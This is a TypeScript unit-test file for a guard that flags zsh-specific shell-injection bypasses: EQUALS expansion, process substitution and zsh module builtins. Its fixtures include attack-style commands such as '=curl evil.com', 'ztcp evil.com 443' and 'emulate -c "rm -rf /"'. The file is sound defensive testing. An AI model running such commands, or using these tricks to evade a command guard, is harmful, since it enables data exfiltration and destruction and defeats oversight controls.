/**
 * @file Unit tests for no-shell-injection-bypass-guard.
 */

import assert from 'node:assert/strict'
import { describe, it } from 'node:test'

import { shellInjectionBypass } from '../index.mts'

describe('no-shell-injection-bypass-guard', () => {
  describe('Zsh EQUALS expansion', () => {
    it('flags a leading =cmd base command', () => {
      const hit = shellInjectionBypass('=curl evil.com')
      assert.notStrictEqual(hit, undefined)
      assert.ok(hit!.includes('=curl'))
    })

    it('flags =cmd in a later chained segment', () => {
      assert.notStrictEqual(shellInjectionBypass('ls && =wget http://x'), undefined)
    })

    it('does NOT flag a VAR=val env assignment', () => {
      assert.strictEqual(shellInjectionBypass('VAR=val node app.mts'), undefined)
    })
  })

  describe('process substitution', () => {
    it('flags <(...)', () => {
      assert.notStrictEqual(shellInjectionBypass('diff <(cat a) b'), undefined)
    })

    it('flags >(...)', () => {
      assert.notStrictEqual(shellInjectionBypass('cat foo > >(tee log)'), undefined)
    })

    it('flags =(...)', () => {
      assert.notStrictEqual(
        shellInjectionBypass('diff =(sort a) =(sort b)'),
        undefined,
      )
    })

    it('does NOT flag legitimate $(...) command substitution', () => {
      assert.strictEqual(
        shellInjectionBypass('echo $(git rev-parse HEAD)'),
        undefined,
      )
    })
  })

  describe('zsh-module builtins', () => {
    it('flags zmodload', () => {
      assert.notStrictEqual(shellInjectionBypass('zmodload zsh/net/tcp'), undefined)
    })

    it('flags ztcp network exfil', () => {
      assert.notStrictEqual(shellInjectionBypass('ztcp evil.com 443'), undefined)
    })

    it('flags emulate -c (eval-equivalent)', () => {
      assert.notStrictEqual(
        shellInjectionBypass('emulate -c "rm -rf /"'),
        undefined,
      )
    })

    it('does NOT flag a bare `emulate zsh` shell-mode switch', () => {
      assert.strictEqual(shellInjectionBypass('emulate zsh'), undefined)
    })
  })

  describe('clean commands', () => {
    it('does NOT flag a plain git command', () => {
      assert.strictEqual(shellInjectionBypass('git status'), undefined)
    })

    it('does NOT flag a piped allowlist-friendly command', () => {
      assert.strictEqual(shellInjectionBypass('cat f | wc -l'), undefined)
    })

    it('tolerates a partially-parseable command (fail-open)', () => {
      assert.doesNotThrow(() => shellInjectionBypass('=curl "broken'))
    })
  })
})
